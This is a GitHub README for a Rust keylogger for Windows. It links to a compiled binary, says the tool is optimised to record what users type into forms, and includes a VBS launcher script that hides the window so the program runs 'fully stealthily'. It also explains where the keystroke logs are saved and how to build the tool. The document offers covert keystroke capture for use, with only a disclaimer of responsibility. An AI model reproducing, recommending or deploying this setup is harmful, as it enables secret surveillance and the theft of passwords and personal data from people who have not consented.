# rust-keylogger
A simple keylogger application implemented in Rust. It was heavily inspired by [kotlin-keylogger](https://github.com/SecretX33/kotlin-keylogger), and its main advantage over it is the resource consumption and the fact that it doesn't mess up with international keywords on Windows while it's running. 

This project was optimized for capturing information entered using the keyboard (like forms and stuff), so in the log file you'll see the actual keys pressed (ex.: `!` instead of `[Shift]1`).

I am not responsible in any way regarding the usage of this software, it is provided as-is, and anything you do with it is your responsibility alone.

## Download

Download the latest compiled binary by [clicking here](https://github.com/SecretX33/rust-keylogger/releases/latest/download/rust-keylogger.exe).

## Run

Just double-click the downloaded `.exe` file.

Be aware that by default, the application will open in console mode (that is, "the black window"), so the software will be visible and can be stopped simply by closing its window.

### But how do I run it stealthily?

It depends on the OS you want to execute it. In `Windows`, for example, create a file called `run.vbs` with the following contents:

```shell
Set WshShell = CreateObject("WScript.Shell") 
WshShell.Run chr(34) & "rust-keylogger.exe" & Chr(34), 0
Set WshShell = Nothing
```

If you execute this `.vbs` file, no console window ("the black window") will appear at all, and the software will be executed fully stealthily. This means that you'll have to kill the process when you want to stop the keylogger.

## FAQ
### How do I stop the program?

You can stop it in many ways, for example, you can close its window, kill its process, shutdown the PC, etc.

### Where do I find the logged keys?

When you run the program, a file named `keys-{current_date_time}.txt` will be created in the same directory that the binary is in, this is where the program will record all pressed keys.

## Registered keys format rules

This software follows some simple rules regarding the format of the registered keys:

- Provide the actual representation of the character whenever possible (e.g.: `!` instead of `[Shift]1`).
- Pressing `Enter` will also jump a line in the log file (to improve readability).
- The representation `[key_name]` will only be used when there is no good equivalent for the key in the ASCII table.
- Not pressing anything for `5 seconds` will generate another timestamp block in the log when the next key is pressed, alongside the time difference between the last and current key press.

## Compile from source

- Install [Rust](https://www.rust-lang.org/tools/install).
- Build the binary by executing this command, the compiled file will be in the `target/[debug|release]` folder.

```shell
# For development build
cargo build

# For release (optimized) build
cargo build --release
```

## License

This project is licensed under [MIT License](LICENSE).
